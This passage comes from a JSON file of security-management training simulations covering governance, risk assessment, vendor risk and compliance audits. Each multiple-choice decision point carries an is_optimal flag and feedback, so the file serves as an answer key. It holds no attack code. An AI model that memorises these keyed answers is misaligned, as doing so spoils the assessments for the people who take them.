decisions made by IT department with CISO having final authority on all security matters", "is_optimal": false, "feedback": "Concentrating all authority in IT/CISO creates silos and misses business context. Security decisions often have operational, legal, financial, and clinical implications that require broader input. This structure also creates a single point of failure for decision-making."}, {"id": "b", "text": "Executive Security Steering Committee with Board reporting, supported by operational Security Working Group", "is_optimal": true, "feedback": "Excellent structure. The Executive Steering Committee (C-suite, including CISO, CMO, COO, General Counsel) provides strategic oversight and policy approval with board visibility. The Security Working Group (technical and operational leads) handles implementation and day-to-day decisions. This provides appropriate authority levels and business alignment."}, {"id": "c", "text": "Compliance Committee handles security governance since HIPAA is the primary driver", "is_optimal": false, "feedback": "Folding security governance under compliance conflates two related but distinct functions. Compliance focuses on meeting regulatory requirements; security governance addresses broader risk management and strategic security decisions. This limits security to a compliance checkbox exercise."}, {"id": "d", "text": "Each facility maintains its own security governance with coordination meetings quarterly", "is_optimal": false, "feedback": "Decentralized governance perpetuates the current fragmentation problem. While local input is valuable, an organization needs unified governance for consistency, efficiency, and clear accountability. Quarterly coordination is too infrequent for effective security management."}]}, {"id": "dp3", "title": "Policy Development Approach", "situation": "The Executive Steering Committee has approved your governance structure. Now you need to develop the actual policies. You've identified 15 policies needed for comprehensive coverage.\n\nThe CMO raises a concern: 'The last time IT rolled out a new policy, clinical staff ignored it because it interfered with patient care. How will these be different?'\n\nHow do you approach policy development to ensure both security effectiveness and clinical adoption?", "question": "What would you do?", "options": [{"id": "a", "text": "Develop policies based on security best practices and mandate compliance through HR disciplinary process", "is_optimal": false, "feedback": "Mandate-only approaches create adversarial relationships and shadow IT. Clinical staff will find workarounds that may be less secure than managed alternatives. Policies developed without operational input often contain impractical requirements."}, {"id": "b", "text": "Let clinical departments write their own policies to ensure operational fit", "is_optimal": false, "feedback": "Delegating policy writing to departments creates inconsistency and may miss security requirements. Clinical experts know workflows but may not understand threat landscape or compliance requirements. Policies need security expertise with clinical input, not the reverse."}, {"id": "c", "text": "Security drafts policies with clinical stakeholder review, pilot testing, and iterative refinement before rollout", "is_optimal": true, "feedback": "Excellent approach. Security expertise ensures requirements are correct while clinical review ensures operational feasibility. Pilot testing reveals practical issues before organization-wide rollout. Iterative refinement builds policies that are both secure and workable."}, {"id": "d", "text": "Adopt industry-standard policy templates to save time and ensure completeness", "is_optimal": false, "feedback": "Templates provide useful starting points but require significant customization. Generic policies don't reflect organizational context, specific systems, or operational workflows. Template policies often read as foreign documents that staff don't recognize as relevant to their work."}]}, {"id": "dp4", "title": "Handling External Considerations", "situation": "As you develop the Access Control Policy, you encounter multiple external considerations that must be addressed:\n\n1. **HIPAA Security Rule** requires access controls with unique user IDs and automatic logoff\n2. **Joint Commission** standards require timely access to patient information for care delivery\n3. **State Law** requires specific breach notification procedures and has stricter requirements than HIPAA\n4. **Medical Staff Bylaws** grant physicians certain privileges that conflict with least privilege principles\n5. **Insurance Requirements** mandate specific controls for cyber liability coverage\n\nThese requirements sometimes conflict. The General Counsel asks: 'How do we handle situations where requirements don't align?'\n\nWhat approach do you recommend?", "question": "What would you do?", "options": [{"id": "a", "text": "Follow the most restrictive requirement in all cases to ensure compliance with everything", "is_optimal": false, "feedback": "While conceptually simple, 'most restrictive' isn't always feasible or appropriate. Some requirements conflict in ways where being more restrictive on one dimension violates another requirement. This approach also ignores operational feasibility and may prevent legitimate business functions."}, {"id": "b", "text": "Create a requirements matrix, identify conflicts, and resolve through risk-based decisions documented with legal review", "is_optimal": true, "feedback": "Excellent approach. Mapping all requirements in a matrix reveals where they align and conflict. Risk-based resolution with legal input ensures decisions consider compliance implications. Documentation provides audit trail and rationale for decisions."}, {"id": "c", "text": "HIPAA takes precedence as the primary healthcare regulation; other requirements are secondary", "is_optimal": false, "feedback": "HIPAA is important but doesn't automatically supersede other requirements. State laws may have stricter requirements that still apply. Joint Commission affects accreditation. Insurance requirements affect coverage. Prioritizing one requirement above all others creates compliance gaps."}, {"id": "d", "text": "Defer to Legal on all external requirement interpretations; security implements what Legal approves", "is_optimal": false, "feedback": "Legal expertise is essential for compliance interpretation, but they shouldn't make all decisions. Legal may not understand technical security implications or operational feasibility. This creates bottlenecks and may result in legally compliant but operationally unworkable policies."}]}, {"id": "dp5", "title": "Data Governance Integration", "situation": "The Research VP approaches you with a challenge. The research clinic conducts clinical trials that involve:\n- Protected Health Information (PHI) from patient participants\n- Genomic data with special sensitivity considerations\n- Data shared with academic partners under Data Use Agreements\n- Data that could be commercialized for future value\n\nShe asks: 'We need a data classification policy, but the generic 'Public/Internal/Confidential/Restricted' model doesn't capture the nuances of our research data. How should we handle this?'\n\nHow do you approach data classification for this complex environment?", "question": "What would you do?", "options": [{"id": "a", "text": "Use the standard four-tier classification model; research data falls under 'Restricted'", "is_optimal": false, "feedback": "Generic classification models don't capture important distinctions in how data can be used. Lumping all sensitive research data as 'Restricted' doesn't differentiate between data that can be shared with partners, data that's truly internal-only, and data with commercialization potential."}, {"id": "b", "text": "Create a separate classification scheme for research data independent of clinical data classification", "is_optimal": false, "feedback": "Parallel classification schemes create confusion and inconsistency. Staff working with both clinical and research data would need to learn two systems. Integration between systems becomes complicated when data flows between contexts."}, {"id": "c", "text": "Develop unified classification framework with base tiers plus data-specific handling tags that address regulatory, sharing, and commercialization requirements", "is_optimal": true, "feedback": "Excellent approach. Base classification tiers provide consistency while handling tags capture specific requirements. This allows 'Restricted + PHI + Research-Shareable' to be distinguished from 'Restricted + PHI + Internal-Only'. Tags enable nuanced handling without creating classification sprawl."}, {"id": "d", "text": "Let the Research VP define classification for research data since she understands it best", "is_optimal": false, "feedback": "Data owners should define classification for their data, but within a framework established by security governance. Delegating framework design to one data owner creates inconsistency and may miss security requirements the data owner doesn't fully understand."}]}], "passing_score": 70, "max_score": 100}, {"id": "D5-SIM-002", "domain": 5, "type": "SIM", "title": "Risk Management", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "Coastal Logistics Corporation"}, "introduction": "Coastal Logistics has been lucky - operating for years without major security incidents despite limited risk management. But the competitor's ransomware disaster was a wake-up call. The board wants to know: What are our risks? How bad could it get? What are we doing about it? Marcus Thompson has tasked you with building a formal security risk management program. The board meeting is in 8 weeks, and they expect answers.", "decision_points": [{"id": "decision_1", "title": "Assessment Methodology Selection", "situation": "The board wants to understand security risks before their meeting in 8 weeks. The CFO wants dollar figures for budgeting. The CISO wants to quickly identify the biggest threats. You have limited historical data on security incidents.", "question": "What risk assessment methodology should you use?", "options": [{"id": "A", "text": "Purely quantitative assessment with detailed financial modeling", "is_optimal": false, "feedback": "{'short': \"Quantitative requires data you don't have\", 'detailed': 'Pure quantitative assessment requires historical incident data, asset valuations, and statistical models. You have limited data and 8 weeks. Quantitative is valuable but not feasible as the only approach for initial assessment. Start qualitative, add quantitative for top risks.'}"}, {"id": "B", "text": "Qualitative assessment first, then quantitative analysis for top risks", "is_optimal": true, "feedback": "{'short': 'Correct! Hybrid approach balances speed with rigor', 'detailed': 'Hybrid approach: qualitative assessment (High/Medium/Low) rapidly identifies and prioritizes risks, then quantitative analysis (ALE, financial modeling) for the top 5-10 risks that need detailed cost-benefit analysis. This meets the timeline while providing CFO with financial data for the biggest risks.'}"}, {"id": "C", "text": "Skip formal assessment - we already know ransomware is the biggest risk", "is_optimal": false, "feedback": "{'short': 'Assumptions are not risk management', 'detailed': 'Assuming you know the risks without assessment may miss significant threats. Ransomware may be a top risk, but what about insider threat? IoT vulnerabilities? Third-party risks from acquired companies? Formal assessment prevents blind spots.'}"}, {"id": "D", "text": "Hire consultants to do quantitative assessment", "is_optimal": false, "feedback": "{'short': \"Consultants can't fix the data problem in 8 weeks\", 'detailed': \"Consultants bring expertise but still need data. In 8 weeks, even experts can't create reliable quantitative models without historical data. They'd likely recommend the hybrid approach anyway. Build internal capability with external support.\"}"}]}, {"id": "decision_2", "title": "Risk Register Scope", "situation": "You're building the risk register. Some stakeholders want every possible risk documented (hundreds). Others want only the top 10. The risk register will be shared with the board and used for operational planning.", "question": "What scope should the risk register have?", "options": [{"id": "A", "text": "Document every possible risk for completeness (200+ entries)", "is_optimal": false, "feedback": "{'short': 'Too many risks obscures what matters', 'detailed': \"A 200-item risk register becomes unmanageable - can't track, update, or report on effectively. Important risks get lost among minor ones. The board doesn't need 200 risks; they need to understand the significant ones. Focus enables action.\"}"}, {"id": "B", "text": "Top 10-15 risks only to keep it manageable", "is_optimal": false, "feedback": "{'short': 'May miss important risks outside top tier', 'detailed': 'Limiting to top 10-15 is too restrictive for an enterprise. You might miss risks that are currently medium but trending up, or risks important to specific business units. A tiered approach captures more while focusing attention appropriately.'}"}, {"id": "C", "text": "All significant risks (30-50) with tiered detail based on severity", "is_optimal": true, "feedback": "{'short': 'Correct! Comprehensive but tiered for manageability', 'detailed': 'Balanced approach: capture all significant risks (typically 30-50 for mid-size organization), but tier the detail and attention. High/Critical risks get detailed analysis, treatment plans, frequent review. Lower risks get documented and periodic review. Board sees top tier; operational teams see their relevant risks.'}"}, {"id": "D", "text": "Only risks that have already caused incidents", "is_optimal": false, "feedback": "{'short': 'Risk management is proactive, not reactive', 'detailed': \"Waiting for incidents to identify risks defeats the purpose. Risk management should identify potential risks before they materialize. The competitor's ransomware attack should inform your risk register even though it didn't happen to you.\"}"}]}, {"id": "decision_3", "title": "Risk Appetite Definition", "situation": "The board asks 'How much risk should we accept?' Different executives have different views - the CFO is conservative, the Chief Commercial Officer wants to move fast, and the General Counsel is concerned about compliance.", "question": "How should organizational risk appetite be determined?", "options": [{"id": "A", "text": "Security team defines risk appetite based on industry best practices", "is_optimal": false, "feedback": "{'short': 'Risk appetite is a business decision, not security decision', 'detailed': \"Risk appetite balances risk against business opportunity - that's a strategic business decision. Security can advise on risk levels and implications, but executives and board must decide how much risk aligns with business strategy. Security doesn't own business strategy.\"}"}, {"id": "B", "text": "Board and executives define appetite with security providing risk context", "is_optimal": true, "feedback": "{'short': 'Correct! Risk appetite is an executive/board decision with expert input', 'detailed': \"Risk appetite is strategic: board and executives decide based on business objectives, competitive landscape, and organizational capacity. Security provides: what risks exist, what happens if they materialize, and what's required to achieve different risk levels. Executives make informed decisions; security enables them.\"}"}, {"id": "C", "text": "Zero risk tolerance - don't accept any security risk", "is_optimal": false, "feedback": "{'short': 'Zero risk means zero business', 'detailed': 'Eliminating all risk would mean not using computers, not having customers, not having employees. Some risk is inherent in business operations. The question is how much risk to accept, not whether to accept any. Zero tolerance applies only to specific categories like regulatory compliance.'}"}, {"id": "D", "text": "Match whatever competitors are doing", "is_optimal": false, "feedback": "{'short': \"Risk appetite should align with your strategy, not competitors'\", 'detailed': 'Competitors may have different business models, risk capacities, or strategies. Your risk appetite should align with your business objectives and capabilities. Competitor benchmarking is informative but not determinative.'}"}]}, {"id": "decision_4", "title": "Risk Treatment Selection", "situation": "A high risk is identified: legacy warehouse systems have unpatched vulnerabilities but can't be updated without significant downtime. Replacing them would cost $5M. The risk of exploitation could cause $20M in losses.", "question": "What risk treatment approach is MOST appropriate?", "options": [{"id": "A", "text": "Accept the risk - replacement is too expensive", "is_optimal": false, "feedback": "{'short': \"Accepting a high risk without mitigation isn't appropriate\", 'detailed': \"Risk acceptance is valid when risk is within appetite or cost of treatment exceeds benefit. But this risk ($20M potential loss) likely exceeds appetite, and there may be mitigation options between 'do nothing' and '$5M replacement.' Explore mitigation before accepting.\"}"}, {"id": "B", "text": "Avoid the risk - shut down the legacy systems", "is_optimal": false, "feedback": "{'short': \"Avoidance isn't practical for critical business systems\", 'detailed': \"These are warehouse management systems - shutting them down shuts the business. Avoidance means eliminating the activity that creates risk, which isn't feasible for core operations. Other treatment options must be considered.\"}"}, {"id": "C", "text": "Mitigate with compensating controls while planning replacement", "is_optimal": true, "feedback": "{'short': 'Correct! Mitigate current risk while addressing root cause', 'detailed': 'Balanced treatment: implement compensating controls now (network segmentation, monitoring, restricted access) to reduce risk, while planning phased replacement to eliminate the root cause. This reduces immediate risk without requiring immediate $5M investment, and creates path to full resolution.'}"}, {"id": "D", "text": "Transfer the risk with cyber insurance", "is_optimal": false, "feedback": "{'short': \"Insurance alone doesn't reduce the risk\", 'detailed': \"Insurance transfers financial risk but doesn't prevent operational disruption, reputational damage, or customer impact. Insurance also may not cover losses from known, unaddressed vulnerabilities. Transfer can supplement mitigation but shouldn't replace it for high operational risks.\"}"}]}, {"id": "decision_5", "title": "Impact Assessment", "situation": "You're assessing the impact of a potential ransomware attack on warehouse operations. Different stakeholders focus on different impacts - IT focuses on recovery cost, Operations on downtime, Finance on revenue loss.", "question": "What impacts should be included in the risk assessment?", "options": [{"id": "A", "text": "Only direct financial costs (recovery, remediation)", "is_optimal": false, "feedback": "{'short': 'Misses operational and reputational impacts', 'detailed': 'Direct costs are just one component. A ransomware attack also causes: operational disruption (revenue loss, SLA penalties), reputational damage (customer trust), regulatory implications (notification costs, potential fines), and competitive harm. Incomplete impact assessment leads to undervaluation of risk.'}"}, {"id": "B", "text": "Comprehensive impact: financial, operational, reputational, regulatory, and strategic", "is_optimal": true, "feedback": "{'short': 'Correct! Comprehensive impact assessment captures true risk', 'detailed': 'Complete impact assessment: direct costs (recovery, remediation), operational losses (downtime, revenue, penalties), reputational damage (customer loss, brand impact), regulatory (notifications, fines, audit costs), and strategic (competitive position, future opportunities). Only by understanding full impact can leadership make informed decisions.'}"}, {"id": "C", "text": "Worst-case scenario only", "is_optimal": false, "feedback": "{'short': \"Worst-case alone doesn't support decision-making\", 'detailed': \"Worst-case is useful for understanding maximum exposure, but decisions need range of scenarios. What's the most likely impact? What's the worst case? This range helps calibrate response. Only presenting worst-case may cause over-reaction or dismissal as unrealistic.\"}"}, {"id": "D", "text": "Whatever IT estimates for system recovery", "is_optimal": false, "feedback": "{'short': 'IT recovery is a fraction of total impact', 'detailed': \"IT estimates technical recovery but doesn't capture business impact. A $500K recovery project is minor compared to $15M in operational losses and customer churn. Risk assessment must include business impact, not just technical costs.\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D5-SIM-003", "domain": 5, "type": "SIM", "title": "Third-Party Risk Management", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "Meridian Financial Services"}, "introduction": "Meridian Financial Services relies heavily on third parties - from cloud providers hosting client portfolios to fintech partners enabling trading capabilities. A recent breach at a marketing vendor exposed client contact information, triggering regulatory inquiries and client complaints. The board wants answers: How many vendors have access to sensitive data? What's their security posture? How would we know if they were breached? Jennifer Walsh has tasked you with building a third-party risk management program that answers these questions and prevents future incidents.", "decision_points": [{"id": "decision_1", "title": "Vendor Prioritization", "situation": "With 380 vendors, you can't assess them all at once. Resources allow thorough assessment of about 60 vendors per year. Some stakeholders want to start with the largest contracts; others want to focus on vendors with data access.", "question": "How should vendors be prioritized for assessment?", "options": [{"id": "A", "text": "By contract value - largest spend first", "is_optimal": false, "feedback": "{'short': \"Contract value doesn't indicate security risk\", 'detailed': 'A high-value facilities contract may pose minimal security risk while a low-cost marketing SaaS may have all your client data. Prioritize by risk factors (data access, criticality), not financial spend.'}"}, {"id": "B", "text": "Risk-based tiering using data sensitivity and system criticality", "is_optimal": true, "feedback": "{'short': 'Correct! Risk-based prioritization focuses resources where risk is highest', 'detailed': 'Risk-based tiering: assess data sensitivity, system criticality, access level, and replaceability. Tier 1 (critical) vendors assessed first and most thoroughly. This ensures limited assessment resources address highest risks. Start with the 42 vendors who access client data or critical systems.'}"}, {"id": "C", "text": "Alphabetically for fairness and completeness", "is_optimal": false, "feedback": "{'short': 'Ignores risk entirely', 'detailed': 'Alphabetical ordering treats all vendors equally regardless of risk. A critical trading platform and an office supply vendor get the same treatment. Risk-based prioritization is fundamental to effective third-party risk management.'}"}, {"id": "D", "text": "Newest vendors first - they're unknown quantities", "is_optimal": false, "feedback": "{'short': \"Recency doesn't indicate risk level\", 'detailed': \"New vendors should be assessed before onboarding, but existing high-risk vendors may pose more immediate concern. A 10-year relationship with a critical data processor that's never been assessed is higher priority than a new low-risk vendor.\"}"}]}, {"id": "decision_2", "title": "Assessment Approach", "situation": "For critical (Tier 1) vendors, you need robust assessments. Some vendors resist detailed questionnaires and won't allow on-site visits. They offer SOC 2 reports and security certifications instead.", "question": "What assessment approach is MOST effective for critical vendors?", "options": [{"id": "A", "text": "Require on-site assessments for all critical vendors", "is_optimal": false, "feedback": "{'short': 'Impractical and vendors may refuse', 'detailed': \"On-site assessments are valuable but: large vendors rarely allow customer audits, you can't visit all critical vendors annually, and on-site visits are expensive. SOC 2 Type II with supplemental questionnaire often provides better coverage.\"}"}, {"id": "B", "text": "Accept any security certification as sufficient", "is_optimal": false, "feedback": "{'short': 'Not all certifications are equal or relevant', 'detailed': 'Certifications vary widely in rigor and scope. A SOC 2 Type II is more rigorous than a self-certified compliance statement. Even good certifications may not cover the specific services you use. Evaluate certification scope and relevance.'}"}, {"id": "C", "text": "Combination: SOC 2 Type II review, targeted questionnaire, and security rating monitoring", "is_optimal": true, "feedback": "{'short': 'Correct! Multi-faceted assessment provides comprehensive view', 'detailed': 'Layered assessment: SOC 2 Type II (independent audit of controls), targeted questionnaire (address your specific concerns and use case), security ratings (continuous outside-in monitoring), and documentation review (policies, incident response). This provides comprehensive assurance without requiring impractical on-site visits.'}"}, {"id": "D", "text": "Rely solely on vendor self-attestation questionnaires", "is_optimal": false, "feedback": "{'short': 'Self-reported data lacks independent verification', 'detailed': 'Questionnaires are valuable but self-reported. Vendors may overstate their security. Independent verification (SOC 2, penetration tests, security ratings) provides assurance that what vendors claim is accurate.'}"}]}, {"id": "decision_3", "title": "Contract Requirements", "situation": "You're negotiating with a new critical vendor. They resist including specific security requirements, saying 'our SOC 2 proves we're secure.' Procurement wants to close the deal quickly. Legal asks what security terms are essential.", "question": "What contract security requirements are ESSENTIAL for a critical vendor?", "options": [{"id": "A", "text": "Just reference their SOC 2 compliance", "is_optimal": false, "feedback": "{'short': \"SOC 2 doesn't cover everything you need\", 'detailed': \"SOC 2 doesn't address: incident notification requirements, your right to audit, data handling at termination, subcontractor requirements, or specific compliance needs. You need contractual commitments beyond their existing certifications.\"}"}, {"id": "B", "text": "Security standards, incident notification, right to audit, data handling, and subcontractor requirements", "is_optimal": true, "feedback": "{'short': 'Correct! These clauses provide necessary protections and oversight', 'detailed': 'Essential contract terms: security standards (baseline they must maintain), incident notification (timely notification of breaches), right to audit (ability to verify compliance), data handling (protection requirements and termination procedures), and subcontractor flow-down (their vendors meet same standards). These create accountability beyond certifications.'}"}, {"id": "C", "text": "Comprehensive 50-page security exhibit covering all possible scenarios", "is_optimal": false, "feedback": "{'short': 'Excessive requirements may delay or prevent deal', 'detailed': 'Overly detailed requirements may be rejected by vendors and delay critical services. Focus on essential requirements that create accountability and oversight. Additional controls can be addressed in ongoing vendor management.'}"}, {"id": "D", "text": "Indemnification clause is sufficient", "is_optimal": false, "feedback": "{'short': \"Indemnification doesn't prevent incidents\", 'detailed': \"Indemnification provides financial recovery after incidents but doesn't prevent them or ensure you're notified. You need proactive requirements (security standards, notification) not just reactive remedies (indemnification).\"}"}]}, {"id": "decision_4", "title": "SOC 2 Report Review", "situation": "A critical vendor provides their SOC 2 Type II report. You notice: the report covers 'Security' trust criteria only, there are three control exceptions noted, and one subservice organization is 'carved out' of the scope.", "question": "What is the MOST significant concern with this SOC 2 report?", "options": [{"id": "A", "text": "Only Security criteria is covered - should include all five", "is_optimal": false, "feedback": "{'short': 'Security is required; others depend on use case', 'detailed': \"Security is the core criterion and required for all SOC 2. Other criteria (availability, processing integrity, confidentiality, privacy) are optional and depend on the service. For data processing, you'd want confidentiality; for transaction processing, processing integrity. Not necessarily all five.\"}"}, {"id": "B", "text": "Three control exceptions - the auditor found problems", "is_optimal": false, "feedback": "{'short': 'Exceptions need review but may not be disqualifying', 'detailed': \"Exceptions indicate control failures but need context. Were they in critical areas? What's the remediation status? A few minor exceptions in a large report may be acceptable. The carved-out subservice organization is potentially more concerning as it may hide significant risk.\"}"}, {"id": "C", "text": "Subservice organization carve-out - critical functions may be unaudited", "is_optimal": true, "feedback": "{'short': 'Correct! Carve-outs can hide significant fourth-party risk', 'detailed': \"Carved-out subservice organizations mean those functions weren't audited. If the carve-out covers where your data is processed or stored (like their cloud infrastructure), you have a significant gap in assurance. You need to either get the subservice organization's SOC 2 or accept unaudited risk. This is often the most significant gap in SOC 2 reports.\"}"}, {"id": "D", "text": "It's Type II - should request Type I instead", "is_optimal": false, "feedback": "{'short': 'Type II is more rigorous than Type I', 'detailed': 'Type II is better - it covers operating effectiveness over a period, not just design at a point in time. Type I only confirms controls exist; Type II confirms they work. Always prefer Type II when available.'}"}]}, {"id": "decision_5", "title": "Vendor Incident Response", "situation": "The marketing vendor confirms that client data was accessed during their ransomware attack. They're still investigating but believe approximately 125,000 client records were exposed. Your contracts require notification within 72 hours; they notified at 72 hours.", "question": "What is the MOST important immediate action?", "options": [{"id": "A", "text": "Terminate the vendor relationship immediately", "is_optimal": false, "feedback": "{'short': 'Termination before understanding full situation is premature', 'detailed': \"Immediate termination may be warranted eventually, but right now you need the vendor's cooperation for investigation, may need their systems for data recovery, and hasty termination could harm your legal position. Assess first, then decide on relationship.\"}"}, {"id": "B", "text": "Determine exact data compromised and assess notification obligations", "is_optimal": true, "feedback": "{'short': 'Correct! Understand scope to determine your obligations', 'detailed': \"Immediate priority: work with vendor to determine exactly what data was compromised (not just accessed), then assess your notification obligations to regulators, clients, and others. You can't make good decisions about notification, communication, or vendor relationship without knowing the scope. Investigation drives all other actions.\"}"}, {"id": "C", "text": "Notify all 125,000 clients immediately", "is_optimal": false, "feedback": "{'short': 'Premature notification may cause unnecessary alarm', 'detailed': \"Notification may be required, but: 'approximately 125,000' isn't precise enough, you don't know exactly what was exposed, and breach notification laws have specific requirements about content. Premature or inaccurate notification can increase harm and legal exposure.\"}"}, {"id": "D", "text": "Wait for vendor's final forensic report", "is_optimal": false, "feedback": "{'short': \"Forensics can take weeks - you can't wait\", 'detailed': \"Final forensics may take weeks or months. You have regulatory and client notification obligations that can't wait indefinitely. Work with vendor's ongoing investigation to get sufficient information for decision-making, even if not final.\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D5-SIM-004", "domain": 5, "type": "SIM", "title": "Compliance and Audit Management", "difficulty": "intermediate", "role": "Security Compliance Manager", "organization": {"name": "Apex Financial Services"}, "introduction": "You've joined Apex Financial Services as Security Compliance Manager during a challenging compliance period. Multiple regulatory frameworks overlap with different requirements, timelines, and evidence needs. Internal audit has flagged documentation gaps, and regulatory examiners are increasing scrutiny on cybersecurity. You must build a sustainable compliance program that satisfies multiple frameworks efficiently while maintaining continuous compliance rather than scrambling before each audit.", "decision_points": [{"id": "dp1", "title": "Compliance Landscape Assessment", "situation": "Your first task is understanding Apex's compliance obligations. You've mapped the following:\n\n**Regulatory Examinations:**\n- OCC: Annual IT examination (6 months away)\n- State regulators: Periodic examinations (timing varies)\n- FDIC: Backup examination authority\n\n**Required Certifications/Attestations:**\n- PCI DSS: Annual assessment + quarterly scans (assessment due in 4 months)\n- SOX 404: Annual controls testing (audit in 3 months)\n- SOC 2: Type II report for wealth management platform (requested by institutional clients)\n\n**Privacy Requirements:**\n- GLBA: Safeguards Rule compliance\n- State privacy laws: Various requirements across operating states\n\nHow do you approach organizing this compliance landscape?", "question": "What would you do?", "options": [{"id": "a", "text": "Address each framework separately with dedicated compliance tracks", "is_optimal": false, "feedback": "Siloed compliance creates duplication and inefficiency. Many controls satisfy multiple frameworks - access controls, encryption, logging. Separate tracks mean demonstrating the same control multiple times with different evidence, wasting resources and creating inconsistency risk."}, {"id": "b", "text": "Create unified control framework mapped to all requirements, with single evidence collection serving multiple audits", "is_optimal": true, "feedback": "Excellent approach. A unified control framework identifies common requirements across regulations. One access control implementation satisfies OCC, PCI, SOX, and GLBA simultaneously. Evidence collected once serves multiple audits. This reduces burden on control owners and ensures consistency."}, {"id": "c", "text": "Focus on regulatory examinations first since they carry enforcement authority; certifications are secondary", "is_optimal": false, "feedback": "Prioritizing regulators over certifications ignores business requirements. PCI non-compliance can result in card processing loss - existential for a bank. SOC 2 affects client relationships. All compliance obligations matter; the solution is efficiency, not prioritization that creates gaps."}, {"id": "d", "text": "Adopt an industry framework like NIST CSF as the baseline and map regulations to it", "is_optimal": false, "feedback": "Using an industry framework as a baseline is helpful but incomplete. NIST CSF doesn't include all specific requirements from PCI, SOX, or banking regulations. The framework provides structure, but you still need explicit mapping to each compliance requirement to ensure nothing is missed."}]}, {"id": "dp2", "title": "Evidence Management Strategy", "situation": "Internal audit flagged that evidence collection is ad-hoc: teams scramble before each audit, evidence is stored in various locations, and documentation often can't be located when needed. Last year's PCI assessment was delayed because firewall rule evidence couldn't be found.\n\nThe CIO asks: 'How do we fix this evidence problem? Auditors keep asking for things we know we have but can't find.'\n\nWhat evidence management approach do you recommend?", "question": "What would you do?", "options": [{"id": "a", "text": "Create shared folders for each compliance framework where teams store evidence before audits", "is_optimal": false, "feedback": "Shared folders are better than nothing but create the same problems at larger scale: inconsistent organization, version control issues, evidence spread across locations. Pre-audit scrambles continue because evidence isn't maintained continuously. This addresses storage but not process."}, {"id": "b", "text": "Implement GRC platform with automated evidence collection, control mapping, and continuous monitoring", "is_optimal": true, "feedback": "Excellent approach. A GRC (Governance, Risk, Compliance) platform centralizes control documentation, maps controls to multiple frameworks, automates evidence collection where possible, and tracks compliance status continuously. This transforms compliance from periodic scrambles to ongoing program."}, {"id": "c", "text": "Assign dedicated compliance analysts to each framework to manage evidence collection", "is_optimal": false, "feedback": "Dedicated staff helps but doesn't solve the underlying process problem. Analysts become bottlenecks and single points of failure. Without proper tools and processes, they'll struggle with the same issues - just with dedicated headcount doing the struggling."}, {"id": "d", "text": "Require control owners to maintain evidence in their existing systems; compliance team collects during audits", "is_optimal": false, "feedback": "Distributed evidence with centralized collection during audits is the current failed model. Control owners have day jobs and won't maintain audit-ready evidence without structure. Collection during audits creates the scrambles you're trying to eliminate."}]}, {"id": "dp3", "title": "Preparing for OCC Examination", "situation": "The OCC IT examination is scheduled for six months from now. Based on previous examination and industry trends, you expect focus on:\n\n- Third-party risk management (previous MRA)\n- IT risk assessment process (previous MRA)\n- Cybersecurity program effectiveness\n- Cloud computing risks\n- Operational resilience\n\nThe CISO asks: 'How do we prepare? Last time we were caught off guard by some questions.'\n\nHow do you approach examination preparation?", "question": "What would you do?", "options": [{"id": "a", "text": "Wait until 60 days before examination to start preparation; earlier preparation wastes time", "is_optimal": false, "feedback": "60 days is not enough time to address significant gaps. MRAs require demonstrated remediation with evidence of sustained compliance. Last-minute preparation creates stress and may not address fundamental issues. Examiners can tell when compliance was rushed."}, {"id": "b", "text": "Begin immediately with MRA remediation validation, gap assessment against expected topics, and documentation review", "is_optimal": true, "feedback": "Excellent approach. Start now with previous findings - validate MRA remediation is complete and sustained. Assess gaps against expected examination focus areas. Review and update documentation. Six months allows genuine improvement, not just audit theater."}, {"id": "c", "text": "Focus exclusively on the two previous MRAs since those are guaranteed examination focus areas", "is_optimal": false, "feedback": "MRAs definitely need attention, but exclusive focus ignores other areas examiners will review. Cybersecurity is increasing examination focus regardless of previous findings. Narrowly focusing on MRAs while ignoring emerging areas creates new risks."}, {"id": "d", "text": "Hire external consultants to conduct a mock examination and identify all gaps", "is_optimal": false, "feedback": "Mock examinations can be valuable but shouldn't be the primary preparation strategy. Consultants identify gaps but may not understand your environment well enough to prioritize effectively. You know your program; start with self-assessment and use consultants to validate."}]}, {"id": "dp4", "title": "Managing Audit Findings", "situation": "Your external PCI QSA has completed their assessment and presented findings:\n\n**Critical (must remediate before certification):**\n- Firewall rules include 'any-any' permits in cardholder data environment\n- Three systems in CDE missing current antivirus signatures\n\n**High:**\n- Encryption keys for stored cardholder data haven't been rotated in 3 years\n- No network segmentation documentation\n\n**Medium:**\n- Quarterly internal vulnerability scans not consistently performed\n- Security awareness training completion below 100%\n\nThe QSA needs evidence of critical remediation within 30 days to proceed with certification. How do you approach remediation?", "question": "What would you do?", "options": [{"id": "a", "text": "Focus all resources on critical findings only; address others after certification", "is_optimal": false, "feedback": "While critical findings need immediate attention, ignoring high findings creates ongoing risk and technical debt. The encryption key issue is a significant security risk. Certification isn't the goal - security is. Address critical immediately but plan for high findings in parallel."}, {"id": "b", "text": "Develop remediation plan addressing all findings with realistic timelines, prioritizing critical but tracking all", "is_optimal": true, "feedback": "Excellent approach. Critical findings get immediate action to meet certification timeline. High and medium findings get remediation plans with realistic timelines. All findings are tracked to closure. This demonstrates mature remediation management and addresses actual security risks."}, {"id": "c", "text": "Challenge the findings with the QSA; some seem overstated based on our compensating controls", "is_optimal": false, "feedback": "Disputing findings without strong basis damages credibility and wastes time. If you have legitimate compensating controls, document them properly. But 'any-any' firewall rules and missing AV signatures are clear violations with little room for interpretation. Fix the issues."}, {"id": "d", "text": "Request extension from QSA to address all findings comprehensively before certification", "is_optimal": false, "feedback": "Extensions may not be possible due to certification deadlines and business requirements. More importantly, the critical findings are straightforward to fix quickly. Firewall rules and AV signatures can be addressed in days, not months. Don't delay when quick fixes are possible."}]}, {"id": "dp5", "title": "Internal Audit Collaboration", "situation": "Internal Audit has approached you about their annual IT audit plan. The Chief Audit Executive (CAE) says: 'We need to test IT general controls for SOX, but we'd also like to provide value beyond compliance checkbox. How can we work together?'\n\nSome IT managers view Internal Audit as adversarial and minimize cooperation. You see an opportunity to improve the relationship.\n\nHow do you approach collaboration with Internal Audit?", "question": "What would you do?", "options": [{"id": "a", "text": "Maintain arm's length relationship; Internal Audit needs independence and shouldn't collaborate closely", "is_optimal": false, "feedback": "Independence doesn't mean adversarial or isolated. Internal Audit can collaborate on scope and approach while maintaining objectivity. Arm's length relationships create defensive dynamics and miss opportunities for Internal Audit to provide value beyond compliance testing."}, {"id": "b", "text": "Partner on risk-based audit planning, share compliance intelligence, and use audit findings as improvement input", "is_optimal": true, 